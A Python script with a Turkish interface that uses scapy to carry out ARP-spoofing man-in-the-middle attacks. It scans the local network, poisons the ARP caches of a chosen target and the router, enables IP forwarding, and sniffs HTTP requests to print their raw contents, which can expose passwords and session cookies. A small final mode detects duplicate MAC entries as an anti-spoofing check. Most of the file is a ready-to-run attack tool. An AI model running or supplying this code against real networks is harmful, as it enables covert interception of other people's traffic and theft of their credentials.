import time
import scapy.all as scapy
import subprocess
import os
import re
from threading import Thread 
from scapy_http import http

def modlar():
    print(" 1- Ağ taraması + MITM Saldırısı \n 2- MITM Saldırısı \n 3- Anti-MITM")
    mod = input("Yapmak istediğiniz işlem numarasını giriniz: ")
    if mod == "1" :
        ip_address_input()
    elif mod == "2":
        mod2_bilgiler()
    elif mod == "3":
    	anti_mitm()


def mod2_bilgiler():
    global target_ip
    global poisoned_ip
    global target_mac
    global poisoned_mac
    global interface
    target_ip = input("Hedefin ip adresini giriniz: ")
    poisoned_ip = input("Modemin ip adresini giriniz: ")
    interface = input("Ağ arayüzünüzü giriniz: ")
    target_mac= get_mac_address(target_ip)
    poisoned_mac= get_mac_address(poisoned_ip)
    networkconnection()
    attack_listening()


def ip_address_input():
    global liste
    user_ip= input("Taramak istediğiniz ip aralığını giriniz: ")
    liste = arp_request_input(user_ip)
    ip_ekleme(liste)
    hedef_bilgileri()


def arp_request_input(user_ip):
    arp_request_packet= scapy.ARP(pdst= user_ip)
    broadcast_packet= scapy.Ether(dst= "ff:ff:ff:ff:ff:ff")
    combined_packet= broadcast_packet/arp_request_packet
    (answered_list, unanswered_list)= scapy.srp(combined_packet,timeout=1)
    answered_list.show()
    return list(answered_list)
def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc


#liste= arp_request_input(ip_address_input())
def ip_ekleme(liste):
    global ip_adresleri
    ip_adresleri=[]
    liste=str(liste).split()
    for i in liste:
        if "psrc" in i:
            ip_adresleri.append(i)



def networkconnection():
    if os.name == "posix":
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def hedef_bilgileri():
    global poisoned_mac
    global target_mac
    global target_ip
    global poisoned_ip
    global interface
    target=input("Hedefin numarasını giriniz: ")
    interface= input("Ağ arayüzünüzü giriniz: ")
    target_ip,poisoned_ip = ip_adresi_alma(int(target))
    poisoned_mac = get_mac_address(poisoned_ip)
    target_mac = get_mac_address(target_ip)
    networkconnection()
    attack_listening()

def ip_adresi_alma(target):
    target_ip = ""
    poisoned_ip=""
    for i in range(len(ip_adresleri[int(target)])):
        if ip_adresleri[target][i] == "=" :
            target_ip = ip_adresleri[target][i+1:]
    for i in range(len(ip_adresleri[0])):
        if ip_adresleri[0][i] == "=":
            poisoned_ip = ip_adresleri[0][i+1:]
    return target_ip,poisoned_ip





def arp_poisoning(target_ip, poisoned_ip,target_mac):
    arp_responce= scapy.ARP(op=2, pdst= target_ip, hwdst= target_mac, psrc= poisoned_ip)
    scapy.send(arp_responce, verbose= False)

def reset_operation(fooled_ip,gateway_ip,fooled_mac,gateway_mac):
    arp_responce= scapy.ARP(op=2, pdst= fooled_ip, hwdst= fooled_mac, psrc= gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_responce,verbose= False, count= 6)

def arp_attack():
    number=0
    try:
        while True:
            arp_poisoning(target_ip,poisoned_ip,target_mac)
            arp_poisoning(poisoned_ip,target_ip,poisoned_mac)
            number+= 2
            print("\rSending Packets " + str(number),end="")
            time.sleep(3)
    except KeyboardInterrupt:
        print("\nQuit & Reset")
        reset_operation(target_ip,poisoned_ip,target_mac,poisoned_mac)
        reset_operation(poisoned_ip,target_ip,poisoned_mac,target_mac)


def listen_packets():
    scapy.sniff(iface= interface,store= False,prn= analyze_packet)
    time.sleep(0.001)
def analyze_packet(packet):
    #packet.show()
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            print(packet[scapy.Raw].load)


def attack_listening():
    if __name__ == "__main__":
        attack= Thread(target= arp_attack)
        sniff= Thread(target= listen_packets, daemon= True)
        attack.start()
        sniff.start(daemon = True)
def anti_mitm():
	hata=[]
	değişken = subprocess.check_output(["arp","-a"])
	veriler=""
	for i in değişken:
		veriler += chr(i)

	if os.name == "posix":
		ip=[]
		mac=[]
		liste = re.split("wlan0|eth0",veriler)
		for i in range(len(liste)):
			liste[i] = liste[i].split(" ")
		for x in range(len(liste)):
			for i in liste[x]:
				if i.count(":") == 5 or i.count("-") == 5:
					mac.append(i)
				elif i.count(".") >= 3:
					ip.append(i)
				else:
					continue
		for a in range(len(mac)):
			if mac.count(mac[a]) > 1:
				if ip.count(ip[a]) ==1:
					hata.append([mac[a],ip[a]])


	elif os.name == "nt":
		deneme = veriler.split("\r\n")
		dynamic = []
		for i in deneme:
			if "dynamic" in i:
				dynamic.append(i)
		deneme3=""
		for i in dynamic:
			deneme3+=i
			deneme3 =deneme3.split()
			for i in range(len(deneme3)):
				if deneme3[i]!= "dynamic":
					if deneme3.count(deneme3[i]) > 1:
						hata.append([deneme3[i-1] , deneme3[i]])
	if len(hata) == 0:
		print("BURADA TEK BAŞINASIN! \n Saldırı altında değilsin.")
	else:
		print("BURADA YALNIZ DEĞİLSİN :( \n {} ip adresi ile {} ip adresinin mac adreslerinde eşleşme bulundu.".format(hata[0][0],hata[1][0]))

modlar()
